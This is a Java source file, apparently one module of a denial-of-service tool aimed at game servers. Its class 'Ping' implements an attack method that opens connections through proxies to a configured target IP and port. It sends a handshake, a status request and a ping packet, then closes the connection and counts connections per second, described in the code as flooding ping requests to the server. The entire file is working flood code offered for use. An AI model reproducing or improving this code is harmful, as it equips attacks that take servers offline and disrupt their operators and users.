package dev.lastknell.core.methods.impl;

import dev.lastknell.core.config.AttackConfig;
import dev.lastknell.core.methods.iAttackMethod;
import dev.lastknell.core.packets.Handshake;
import dev.lastknell.core.packets.PingPacket;
import dev.lastknell.core.proxy.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Ping implements iAttackMethod {
    private final AttackConfig config;
    private final byte[] handshake;

    public Ping(AttackConfig config) {
        this.config = config;
        handshake = Handshake.getWrappedPacket(config.protocolID, config.srvIp, config.port, 1);
    }

    @Override
    public void accept(Channel channel, Proxy proxy) {
        config.cpsinfo.openedCPS++;
        channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake));
        channel.writeAndFlush(Unpooled.buffer().writeBytes(new byte[]{1, 0}));
        channel.writeAndFlush(Unpooled.buffer().writeBytes((PingPacket.getWrappedPacket(System.currentTimeMillis()))));
        config.cpsinfo.successfulCPS++;
        channel.close();
    }

    @Override
    public String getName() {
        return "Ping";
    }

    @Override
    public String getDescription() {
        return "Floods Ping request to the server";
    }

}
